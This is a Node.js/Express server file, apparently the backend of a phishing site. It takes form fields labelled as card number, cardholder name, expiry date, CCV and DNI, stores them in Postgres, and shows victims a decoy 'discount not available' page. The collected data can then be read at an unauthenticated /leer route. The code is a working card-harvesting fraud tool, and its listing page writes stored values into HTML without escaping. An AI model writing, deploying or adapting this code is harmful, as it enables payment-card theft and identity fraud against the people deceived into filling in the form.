const express = require("express");
const { Pool } = require("pg");
const path = require("path");

const app = express();

app.use(express.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: process.env.DATABASE_URL ? { rejectUnauthorized: false } : false
});

async function crearTabla() {
  await pool.query(`
    CREATE TABLE IF NOT EXISTS registros (
      id SERIAL PRIMARY KEY,
      input1 TEXT,
      input2 TEXT,
      input3 TEXT,
      input4 TEXT,
      input5 TEXT,
      input6 TEXT,
      fecha TIMESTAMP DEFAULT CURRENT_TIMESTAMP
    )
  `);
}

crearTabla().catch(console.error);

app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

app.post("/guardar", async (req, res) => {
  try {
    const { input1, input2, input3, input4, input5, input6 } = req.body;

    await pool.query(
      `
      INSERT INTO registros 
      (input1, input2, input3, input4, input5, input6)
      VALUES ($1, $2, $3, $4, $5, $6)
      `,
      [input1, input2, input3, input4, input5, input6]
    );

    res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <title>No disponible</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            background: #f2f2f2;
            height: 100vh;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
          }
          .cartel {
            background: white;
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 0 15px rgba(0,0,0,.2);
            text-align: center;
          }
        </style>
      </head>
      <body>
        <div class="cartel">
          <h1>DESCUENTO ACTUALMENTE NO DISPONIBLE</h1>
        </div>
      </body>
      </html>
    `);

  } catch (error) {
    console.error(error);
    res.status(500).send("Error al guardar los datos");
  }
});

app.get("/leer", async (req, res) => {
  try {
    const resultado = await pool.query(`
      SELECT * FROM registros 
      ORDER BY id DESC
    `);

    let filas = "";

    resultado.rows.forEach(r => {
      filas += `
        <tr>
          <td>${r.id}</td>
          <td>${r.input1 || ""}</td>
          <td>${r.input2 || ""}</td>
          <td>${r.input3 || ""}</td>
          <td>${r.input5 || ""}</td>
          <td>${r.input6 || ""}</td>
        </tr>
      `;
    });

    res.send(`
      <!DOCTYPE html>
      <html lang="es">
      <head>
        <meta charset="UTF-8">
        <title>Registros</title>
        <style>
          body {
            font-family: Arial, sans-serif;
            padding: 20px;
            background: #f5f5f5;
          }
          table {
            border-collapse: collapse;
            width: 100%;
            background: white;
          }
          th, td {
            border: 1px solid #ccc;
            padding: 8px;
            text-align: left;
          }
          th {
            background: #222;
            color: white;
          }
        </style>
      </head>
      <body>
        <h2>Registros guardados</h2>

        <table>
          <tr>
            <th>ID</th>
            <th>Numero</th>
            <th>Nombre</th>
            <th>Vence</th>
            <th>Input 4</th>
            <th>CCV</th>
            <th>DNI</th>
            <th>Fecha</th>
          </tr>
          ${filas}
        </table>
      </body>
      </html>
    `);

  } catch (error) {
    console.error(error);
    res.status(500).send("Error al leer los registros");
  }
});

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Servidor activo en puerto " + PORT);
});
